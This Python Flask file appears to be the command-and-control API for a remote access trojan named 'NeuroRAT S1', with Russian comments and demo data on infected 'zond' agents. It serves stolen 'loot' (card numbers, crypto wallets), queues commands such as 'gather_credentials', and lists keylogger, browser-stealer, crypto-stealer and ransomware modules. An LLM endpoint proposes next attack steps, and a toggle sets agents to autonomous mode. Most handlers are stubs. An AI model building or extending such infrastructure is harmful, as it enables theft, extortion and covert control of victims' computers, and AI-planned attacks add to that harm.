#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import logging
import datetime
import random
from flask import Flask, request, jsonify, session, Response

# Добавляем пути для импорта модулей
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'core'))
sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'server'))

# Пытаемся импортировать модули нейрозондов если они доступны
try:
    neurozond_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'neurozond')
    if neurozond_path not in sys.path:
        sys.path.append(neurozond_path)
    has_neurozond = True
    logging.info("Модули зондов найдены и готовы к использованию")
except ImportError:
    has_neurozond = False
    logging.warning("Модули зондов не найдены, будет использована демо-версия API")

# Настройка логирования
if not os.path.exists('logs'):
    os.makedirs('logs')
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/server.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Секретный ключ для сессий
app.secret_key = os.urandom(24)

# Глобальные данные (используются до подключения к базе данных)
# В реальном приложении эти данные будут в базе данных
agents_data = [
    {
        'agent_id': 'zond-1',
        'os': 'Linux',
        'hostname': 'server-demo-01',
        'username': 'admin',
        'ip_address': '192.168.1.100',
        'status': 'active',
        'last_seen': datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
    },
    {
        'agent_id': 'zond-2',
        'os': 'Windows',
        'hostname': 'desktop-demo-02',
        'username': 'user',
        'ip_address': '192.168.1.101',
        'status': 'inactive',
        'last_seen': (datetime.datetime.now() - datetime.timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%S")
    },
    {
        'agent_id': 'zond-3',
        'os': 'macOS',
        'hostname': 'macbook-demo-03',
        'username': 'developer',
        'ip_address': '192.168.1.102',
        'status': 'active',
        'last_seen': datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
    }
]

logs_data = [
    {
        'timestamp': int(datetime.datetime.now().timestamp()) - 3600,
        'agent_id': 'zond-1',
        'event_type': 'connection',
        'details': 'Зонд подключился к серверу S1'
    },
    {
        'timestamp': int(datetime.datetime.now().timestamp()) - 1800,
        'agent_id': 'zond-1',
        'event_type': 'command',
        'details': 'Запрос системной информации'
    },
    {
        'timestamp': int(datetime.datetime.now().timestamp()) - 600,
        'agent_id': 'zond-3',
        'event_type': 'connection',
        'details': 'Зонд подключился к серверу S1'
    }
]

files_data = [
    {
        'file_id': 'file-1',
        'name': 'passwords.txt',
        'agent_id': 'zond-1',
        'size': '2.4 KB',
        'category': 'credentials',
        'timestamp': int(datetime.datetime.now().timestamp()) - 1200
    },
    {
        'file_id': 'file-2',
        'name': 'screenshot_001.png',
        'agent_id': 'zond-1',
        'size': '145 KB',
        'category': 'screenshot',
        'timestamp': int(datetime.datetime.now().timestamp()) - 600
    },
    {
        'file_id': 'file-3',
        'name': 'system_info.json',
        'agent_id': 'zond-3',
        'size': '5.1 KB',
        'category': 'system',
        'timestamp': int(datetime.datetime.now().timestamp()) - 300
    }
]

loot_data = [
    {
        'type': 'card',
        'value': '41XX XXXX XXXX X123',
        'agent_id': 'zond-1',
        'timestamp': int(datetime.datetime.now().timestamp()) - 1800,
        'tags': 'visa, личная',
        'notes': 'Найдена в браузере Chrome'
    },
    {
        'type': 'wallet',
        'value': '0x1a2b3c4d5e6f...',
        'agent_id': 'zond-2',
        'timestamp': int(datetime.datetime.now().timestamp()) - 3600,
        'tags': 'eth, metamask',
        'notes': 'Найден в кэше браузера'
    }
]

# Эмуляция интеграции с zonds
zonds_data = [
    {
        'id': 'zond-1',
        'name': 'Test Zond 1',
        'status': 'ACTIVE',
        'ipAddress': '192.168.1.100',
        'os': 'Linux',
        'lastSeen': datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
    },
    {
        'id': 'zond-2',
        'name': 'Test Zond 2',
        'status': 'INACTIVE',
        'ipAddress': '192.168.1.101',
        'os': 'Windows',
        'lastSeen': (datetime.datetime.now() - datetime.timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%S")
    }
]

tasks_data = [
    {
        'id': 'task-1',
        'zondId': 'zond-1',
        'command': 'scan_network',
        'status': 'COMPLETED',
        'createdAt': (datetime.datetime.now() - datetime.timedelta(minutes=30)).strftime("%Y-%m-%dT%H:%M:%S"),
        'completedAt': datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
    },
    {
        'id': 'task-2',
        'zondId': 'zond-2',
        'command': 'gather_credentials',
        'status': 'PENDING',
        'createdAt': datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S"),
        'completedAt': None
    }
]

# Функция проверки авторизации
def check_auth():
    if 'logged_in' in session and session['logged_in']:
        return True
    return False

# Защита API с помощью декоратора
def require_auth(f):
    def decorated(*args, **kwargs):
        if not check_auth():
            return jsonify({'error': 'Unauthorized'}), 401
        return f(*args, **kwargs)
    decorated.__name__ = f.__name__
    return decorated

# Базовые маршруты

@app.route('/')
def root():
    return jsonify({
        'name': 'NeuroRAT S1 API',
        'version': '2.0.0',
        'description': 'API сервер для управления зондами',
        'documentation': '/api/docs'
    })

@app.route('/api/docs')
def api_docs():
    return jsonify({
        'endpoints': [
            {'path': '/api/status', 'method': 'GET', 'description': 'Получить статус системы'},
            {'path': '/api/login', 'method': 'POST', 'description': 'Аутентификация'},
            {'path': '/api/zonds', 'method': 'GET', 'description': 'Получить список зондов'},
            {'path': '/api/logs', 'method': 'GET', 'description': 'Получить логи системы'},
            {'path': '/api/files', 'method': 'GET', 'description': 'Получить список файлов'},
            {'path': '/api/loot', 'method': 'GET', 'description': 'Получить добытые данные'},
            {'path': '/api/metrics', 'method': 'GET', 'description': 'Получить метрики системы'},
            {'path': '/api/zonds', 'method': 'GET', 'description': 'Получить список зондов'},
            {'path': '/api/tasks', 'method': 'GET', 'description': 'Получить задачи зондов'}
        ]
    })

@app.route('/api/status')
def status():
    return jsonify({
        'status': 'ok', 
        'version': '2.0.0',
        'uptime': '3 hours 12 minutes',
        'connected_zonds': len([z for z in zonds_data if z['status'] == 'ACTIVE']),
        'total_zonds': len(zonds_data),
        'tasks_pending': len([t for t in tasks_data if t['status'] == 'PENDING']),
        'tasks_total': len(tasks_data)
    })

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    
    # Заглушка для аутентификации
    if username == 'admin' and password == 'admin':
        session['logged_in'] = True
        session['username'] = username
        return jsonify({'status': 'success', 'token': 'dummy_token'})
    return jsonify({'status': 'error', 'message': 'Invalid credentials'}), 401

@app.route('/api/logout')
def logout():
    session.pop('logged_in', None)
    session.pop('username', None)
    return jsonify({'status': 'success'})

# API маршруты для зондов

@app.route('/api/zonds')
@require_auth
def get_zonds():
    # Фильтрация по статусу и поиск по тексту
    status_filter = request.args.get('status', '')
    search_query = request.args.get('search', '').lower()
    
    filtered_zonds = agents_data
    
    if status_filter:
        filtered_zonds = [a for a in filtered_zonds if a['status'] == status_filter]
    
    if search_query:
        filtered_zonds = [a for a in filtered_zonds if 
                         search_query in a['agent_id'].lower() or
                         search_query in a['hostname'].lower() or
                         search_query in a['username'].lower() or
                         search_query in a['ip_address'].lower()]
    
    return jsonify({'zonds': filtered_zonds})

@app.route('/api/zonds/<zond_id>')
@require_auth
def get_zond(zond_id):
    for zond in zonds_data:
        if zond['id'] == zond_id:
            return jsonify(zond)
    return jsonify({'error': 'Zond not found'}), 404

@app.route('/api/tasks')
@require_auth
def get_tasks():
    return jsonify(tasks_data)

@app.route('/api/tasks/<task_id>')
@require_auth
def get_task(task_id):
    for task in tasks_data:
        if task['id'] == task_id:
            return jsonify(task)
    return jsonify({'error': 'Task not found'}), 404

@app.route('/api/zonds/<zond_id>/execute', methods=['POST'])
@require_auth
def execute_command(zond_id):
    data = request.json
    command = data.get('command')
    
    if not command:
        return jsonify({'error': 'Command is required'}), 400
    
    # Проверка существования зонда
    zond = None
    for z in zonds_data:
        if z['id'] == zond_id:
            zond = z
            break
    
    if not zond:
        return jsonify({'error': 'Zond not found'}), 404
    
    # Создаем новую задачу
    task_id = f'task-{len(tasks_data) + 1}'
    new_task = {
        'id': task_id,
        'zondId': zond_id,
        'command': command,
        'status': 'PENDING',
        'createdAt': datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S"),
        'completedAt': None
    }
    
    tasks_data.append(new_task)
    
    # В реальном приложении здесь был бы код для отправки команды на зонд
    # и получения результатов асинхронно
    
    return jsonify({'status': 'success', 'taskId': task_id})

# API маршруты для зондов

@app.route('/api/agents')
@require_auth
def get_agents():
    # Фильтрация по статусу и поиск по тексту
    status_filter = request.args.get('status', '')
    search_query = request.args.get('search', '').lower()
    
    filtered_agents = agents_data
    
    if status_filter:
        filtered_agents = [a for a in filtered_agents if a['status'] == status_filter]
    
    if search_query:
        filtered_agents = [a for a in filtered_agents if 
                         search_query in a['agent_id'].lower() or
                         search_query in a['hostname'].lower() or
                         search_query in a['username'].lower() or
                         search_query in a['ip_address'].lower()]
    
    return jsonify({'agents': filtered_agents})

@app.route('/api/logs')
@require_auth
def get_logs_api():
    # Фильтрация по типу и поиск по тексту
    type_filter = request.args.get('type', '')
    search_query = request.args.get('search', '').lower()
    
    filtered_logs = logs_data
    
    if type_filter:
        filtered_logs = [l for l in filtered_logs if l['event_type'] == type_filter]
    
    if search_query:
        filtered_logs = [l for l in filtered_logs if 
                       search_query in l['agent_id'].lower() or
                       search_query in l['event_type'].lower() or
                       search_query in l['details'].lower()]
    
    return jsonify({'logs': filtered_logs})

@app.route('/api/files')
@require_auth
def get_files():
    # Поиск по тексту
    search_query = request.args.get('search', '').lower()
    
    filtered_files = files_data
    
    if search_query:
        filtered_files = [f for f in filtered_files if 
                        search_query in f['name'].lower() or
                        search_query in f['agent_id'].lower() or
                        search_query in f['category'].lower()]
    
    return jsonify({'files': filtered_files})

@app.route('/api/files/upload', methods=['POST'])
@require_auth
def upload_file():
    # Заглушка для загрузки файлов
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    
    file = request.files['file']
    agent_id = request.form.get('agent_id', 'manual')
    category = request.form.get('category', 'other')
    
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
    
    # В реальном приложении здесь был бы код для сохранения файла
    new_file = {
        'file_id': f'file-{len(files_data) + 1}',
        'name': file.filename,
        'agent_id': agent_id,
        'size': '10 KB',  # Заглушка
        'category': category,
        'timestamp': int(datetime.datetime.now().timestamp())
    }
    
    files_data.append(new_file)
    
    return jsonify({'status': 'success', 'file_id': new_file['file_id']})

@app.route('/api/files/download')
@require_auth
def download_file():
    file_id = request.args.get('file_id')
    
    # Заглушка для скачивания файлов
    for f in files_data:
        if f['file_id'] == file_id:
            # В реальном приложении здесь был бы код для отдачи файла
            return jsonify({'status': 'success', 'message': f'Downloading file {f["name"]}'})
    
    return jsonify({'error': 'File not found'}), 404

@app.route('/api/files/delete', methods=['POST'])
@require_auth
def delete_files():
    data = request.json
    file_ids = data.get('file_ids', [])
    
    # Заглушка для удаления файлов
    for file_id in file_ids:
        global files_data
        files_data = [f for f in files_data if f['file_id'] != file_id]
    
    return jsonify({'status': 'success'})

@app.route('/api/loot')
@require_auth
def get_loot():
    # Фильтрация по типу и поиск по тексту
    type_filter = request.args.get('type', '')
    search_query = request.args.get('search', '').lower()
    
    filtered_loot = loot_data
    
    if type_filter:
        filtered_loot = [l for l in filtered_loot if l['type'] == type_filter]
    
    if search_query:
        filtered_loot = [l for l in filtered_loot if 
                       search_query in l['value'].lower() or
                       search_query in l['agent_id'].lower() or
                       search_query in l['tags'].lower()]
    
    return jsonify({'loot': filtered_loot})

@app.route('/api/metrics')
@require_auth
def get_metrics():
    # Подготовка метрик для API
    active_zonds = len([a for a in agents_data if a['status'] == 'active'])
    total_zonds = len(agents_data)
    
    # Категории файлов
    files_by_category = {}
    for f in files_data:
        cat = f['category']
        if cat not in files_by_category:
            files_by_category[cat] = 0
        files_by_category[cat] += 1
    
    # Топ зондов по количеству файлов
    zond_files = {}
    for f in files_data:
        agent_id = f['agent_id']
        if agent_id not in zond_files:
            zond_files[agent_id] = 0
        zond_files[agent_id] += 1
    
    top_zonds = [{'zond_id': a, 'files': c} for a, c in zond_files.items()]
    top_zonds.sort(key=lambda x: x['files'], reverse=True)
    top_zonds = top_zonds[:5]  # Топ 5
    
    return jsonify({
        'total_zonds': total_zonds,
        'active_zonds': active_zonds,
        'total_logs': len(logs_data),
        'total_files': len(files_data),
        'files_by_category': files_by_category,
        'top_zonds': top_zonds
    })

@app.route('/api/zond/<zond_id>/command', methods=['POST'])
@require_auth
def zond_command(zond_id):
    data = request.json
    command = data.get('command')
    
    if not command:
        return jsonify({'error': 'Command is required'}), 400
        
    # Здесь был бы код для отправки команды зонду
    
    return jsonify({
        'status': 'success',
        'message': f'Команда "{command}" отправлена зонду {zond_id}'
    })

# Новый API для модулей

@app.route('/api/modules')
@require_auth
def get_modules():
    modules = [
        {'id': 'keylogger', 'name': 'Keylogger', 'description': 'Модуль для записи нажатий клавиш', 'status': 'active'},
        {'id': 'screenshot', 'name': 'Screenshot', 'description': 'Модуль для создания снимков экрана', 'status': 'active'},
        {'id': 'browser', 'name': 'Browser Stealer', 'description': 'Модуль для кражи данных браузера', 'status': 'active'},
        {'id': 'crypto', 'name': 'Crypto Stealer', 'description': 'Модуль для кражи криптовалют', 'status': 'active'},
        {'id': 'ransomware', 'name': 'Ransomware', 'description': 'Модуль для шифрования файлов', 'status': 'inactive'},
        {'id': 's1', 'name': 'Communication', 'description': 'Модуль для связи с S1', 'status': 'active'}
    ]
    
    return jsonify({'modules': modules})

@app.route('/api/zond/<zond_id>/module/<module_id>', methods=['POST'])
@require_auth
def execute_module(zond_id, module_id):
    data = request.json
    params = data.get('params', {})
    
    # Здесь был бы код для выполнения модуля на зонде
    
    return jsonify({
        'status': 'success',
        'message': f'Модуль {module_id} запущен на зонде {zond_id}',
        'params': params
    })

# API для интеграции с LLM

@app.route('/api/llm/query', methods=['POST'])
@require_auth
def llm_query():
    data = request.json
    query = data.get('query')
    context = data.get('context', {})
    
    if not query:
        return jsonify({'error': 'Query is required'}), 400
    
    # Здесь был бы код для отправки запроса в LLM
    
    # Заглушка ответа
    response = {
        'answer': 'Это ответ от LLM на запрос: ' + query,
        'confidence': 0.85,
        'suggested_actions': [
            {'action': 'run_module', 'module_id': 'keylogger', 'params': {'duration': 60}},
            {'action': 'run_command', 'command': 'whoami'}
        ]
    }
    
    return jsonify(response)

@app.route('/api/zond/<zond_id>/autonomy', methods=['POST'])
@require_auth
def toggle_autonomy(zond_id):
    data = request.json
    enabled = data.get('enabled', False)
    
    # Включение/выключение автономного режима для зонда
    
    return jsonify({
        'status': 'success',
        'zond_id': zond_id,
        'autonomy': 'enabled' if enabled else 'disabled'
    })

if __name__ == '__main__':
    logger.info("Starting API server on port 8080...")
    app.run(host='0.0.0.0', port=8080, debug=True) 